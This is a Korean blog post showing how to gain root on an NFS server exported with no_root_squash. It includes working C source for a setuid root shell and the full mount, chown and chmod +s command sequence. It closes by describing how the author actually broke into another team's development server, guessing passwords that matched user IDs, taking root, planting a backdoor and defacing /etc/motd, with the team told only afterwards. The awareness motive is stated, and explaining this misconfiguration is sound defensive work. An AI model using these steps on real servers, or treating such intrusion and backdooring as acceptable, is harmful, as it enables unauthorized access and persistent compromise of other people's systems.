---
title: "NFS 서버 취약점 해킹 예"
category: [Security]
toc: true
toc_label: "이 페이지 목차"
---

NFS 서버 설정 취약점을 이용한 해킹 방법을 공개하고, 해킹을 방지할 수 있도록 방법을 공유한다.

## 동기
사내 개발 서버들에서 NFS 서버를 설치하여, 장치 개발시 NFS로 마운트하여 실행하는 환경을 제공하는데, 이때 NFS 서버 설정을 잘못하게 되면 root 권한이 탈취될 수 있는 심각한 취약점이 있다는 것을 모르는 서버 관리자들이 많아서, 그 위험성을 보여주고 올바르게 설정하여 서버가 해킹되는 것을 방지하고자 한다.

## NFS 서버 설치
Ubuntu 환경에서는 아래와 같이 설치할 수 있다.
```sh
$ sudo apt install nfs-kernel-server
```

이후 NFS 디렉토리로 사용할 경로를 생성하고 (본 예제에서는 /opt/nfs), `/etc/exports` 설정 파일에 아래와 같이 추가한다.
```ruby
/opt/nfs *(rw,root_squash,sync,no_subtree_check)
```

여기에서 root_squash, no_root_squash 옵션이 중요한데, 각 의미는 다음과 같다.
- **<font color=blue>root_squash</font>**: 클라이언트 호스트의 uid 0에서의 request를 서버의 uid 65534로 매핑함으로써, 지정된 호스트의 root 유저의 액세스를 거부하는 보안 기능이다. (uid 65534는 유저 nobody 임)
- **<font color=red>no_root_squash</font>**: uid 0으로부터의 request를 매핑하지 않는다. 즉, client의 root는 server의 root와 같은 권한을 가지므로 보안 위험이 있다.

이후 아래와 같이 NFS 서버를 시작시키면 된다.
```sh
$ sudo service nfs-server restart
```

참고로 NFS export 된 경로 정보는 아래와 같이 확인할 수 있다.
```sh
$ sudo exportfs -v
```

그런데 보안 목적으로 **root_squash** 옵션을 사용하는 경우에는, NFS 클라이언트의 core dump 파일이 NFS 디렉토리에 생성될 수 없으므로, 이 경우에는 NFS 클라이언트에서 아래 예와 같이 core dump 파일을 외부 USB 저장 장치에 저장하도록 하면 된다.
```java
# mount -t vfat /dev/sda1 /mnt/usb/
# echo "/mnt/usb/core" > /proc/sys/kernel/core_pattern
```

## no_root_squash 설정 서버 해킹하기
만약에 NFS 서버의 설정이 **<font color=red>no_root_squash</font>** 설정이라면, 조건만 맞으면 쉽게 NFS 서버의 root 권한을 탈취할 수 있다. 아래는 타겟 NFS 서버에서 일반 사용자 계정을 갖고 있는 사용자가 NFS 서버의 root 권한을 취득하는 과정이다.  
먼저 NFS 서버에서 일반 사용자는 아래와 NFS export 옵션을 확인해 본다.
```sh
$ cat /etc/exports
```
결과로 만약에 명시적으로 **<font color=blue>root_squash</font>** 옵션이 지정되어 있지 않으면 (즉, **<font color=red>no_root_squash</font>** 옵션이 지정되어 있으면), 아래와 같은 방법으로 root 권한의 shell을 얻을 수 있다.
1. Root 권한의 shell을 얻는 코드를 아래와 같이 작성한다. (예로 NFS 서버에서 root_shell.c 이름으로 작성)
   ```c
   #include <fcntl.h>
   #include <stdlib.h>
   #include <sys/stat.h>
   #include <unistd.h>

   int main()
   {
       setuid(0);
       setgid(0);
       close(0);
       open("/dev/tty", O_RDWR);
       system("/bin/sh");
       return 0;
   }
   ```
   참고로 테스트로 위 코드를 본인이 root 권한을 가진 서버에서 아래와 같이 테스트해 보면, root 권한이 얻어짐을 확인할 수 있다.
   ```java
   $ gcc -o root_shell root_shell.c
   $ sudo chown root:root root_shell
   $ sudo chmod +s root_shell
   $ ./root_shell
   # whoami
   root
   ```
   즉, 이 실행 파일의 owner를 root로 변경하고, `+s` 모드를 주어서 실행하면, root 권한을 얻을 수 있다는 것을 알 수 있다. 이제 이 작업을 NFS 클라이언트에서 **no_root_squash** 보안 취약점을 이용하여 설정하면 된다.
1. root_shell 프로그램을 NFS 마운트 경로에 복사한 후에 사용자를 root로 변경하고, suid(set-user-identifier) 모드를 준다. 다음과 같은 방법 중의 하나를 사용하면 된다.
   - **방법 1**: 자신의 개발 서버를 NFS 클라이언트로 이용하기  
     본인 개발 서버에서 아래와 같이 빌드한 후에, 실행 속성을 준다. (해킹하려는 NFS 서버의 GLIBC 버전이 다르면 실행이 안되므로 `-static` 옵션을 주어서 빌드)
     ```sh
     $ gcc -static -o root_shell root_shell.c
     ```
     아래 예와 같이 자신의 서버에서 (NFS 클라이언트 역할을 함) 타겟 NFS 서버를 마운트시킨다.
     ```sh
     $ mkdir {NFS_클라이언트_마운트_경로}
     $ sudo mount -o nolock  {NFS_서버_IP}:{NFS_서버_마운트_경로} {NFS_클라이언트_마운트_경로}
     ```
     이제 자신의 개발 서버에서 마운트된 NFS 경로로 root_shell 프로그램을 복사한 후에 suid 모드를 준다.
     ```sh
     $ sudo cp root_shell {NFS_클라이언트_마운트_경로}/
     $ cd {NFS_클라이언트_마운트_경로}/
     $ sudo chown root:root ./root_shell
     $ sudo chmod +s ./root_shell
     ```
     결과로 타겟 NFS 서버의 마운트된 경로에 있는 root_shell 프로그램의 모드가 `-rwsr-sr-x`로 설정된다.
   - **방법 2**: 자신의 개발용 디바이스를 NFS 클라이언트로 이용하기  
     타겟 NFS 서버에 일반 사용자 권한으로 로그인한 후에, 위의 root_shell.c 파일을 작성한 후에 아래와 같이 빌드한다. (동일 서버에서 실행시킬 것이므로 `-static` 옵션 유무는 상관없음)
     ```sh
     $ gcc -o root_shell root_shell.c
     ```
     타겟 NFS 서버에서 빌드된 실행 파일을 NFS 마운트되는 경로로 복사한다.
     ```sh
     $ cp root_shell {NFS_서버_마운트_경로}/
     ```
     이후 디바이스에서 아래와 같이 NFS 디렉토리를 마운트한다.
     ```java
     # mkdir {NFS_클라이언트_마운트_경로}
     # mount -o nolock {NFS_서버_IP}:{NFS_서버_마운트_경로} {NFS_클라이언트_마운트_경로}
     # cd {NFS_클라이언트_마운트_경로}/
     ```
     디바이스에서 root_shell 프로그램의 사용자를 root로 변경하고, suid 모드를 준다.
     ```java
     # chown root:root ./root_shell
     # chmod +s ./root_shell
     ```
     결과로 마찬가지로 타겟 NFS 서버의 마운트된 경로에 있는 root_shell 프로그램의 모드가 `-rwsr-sr-x`로 설정된다.
1. 이제 타겟 NFS 서버에 일반 사용자 권한으로 로그인 한 후에, NFS 마운트 경로의 root_shell 프로그램을 확인해 보면, 사용자 및 모드가 아래 예와 같이 설정되어 있음을 확인할 수 있다.
   ```sh
   $ ls -l root_shell
   -rwsrwsr-x 1 root root 915120  3월 16 09:10 root_shell
   ```
   이제 NFS 서버에서 일반 사용자 권한으로 이 파일을 실행하면 root 권한의 shell이 얻어진다.
   ```java
   $ ./root_shell
   # whoami
   root
   ```

## 다른 팀의 NFS 서버 해킹 사례
실제로 다른 팀의 개발 서버를 위 방법을 사용하여 root 권한을 획득하였다.  
먼저 [<u>Advanced Port Scanner</u>](http://www.advanced-port-scanner.com/) 툴로 포트 스캔을 하여 NFS 서버 기능을 제공하는 서버의 IP를 획득하였고, 이 툴에서 제공하는 기능을 이용하여, 전체 사용자의 SSH ID를 얻었다.  
사용자의 password도 얻어야 하는데, 타겟 서버의 경우 놀랍게도 몇몇 사용자의 경우 ID와 password가 동일하여, 쉽게 ID/PW를 확보할 수 있었다.  
사실상 NFS 서비스는 극히 가벼운 서비스이므로, 주로 개발 서버에 NFS 서비스도 추가하는 형태이고, 주요 개발 서버인데 NFS 서버의 취약점을 이용하여 위와 같은 방법으로 아주 간단하게 root 권한을 탈취할 수 있었다. 😱  
해당 서버의 root 권한을 얻은 후에, 몇가지 프로그램도 설치하고, 백도어도 만들고, `/etc/motd` 파일을 이용하여 매번 사용자 로그인시마다 시스템이 해킹되었다고 대문짝만하게 noti하고, 유선 상으로도 해당 사실을 알려 주었다.
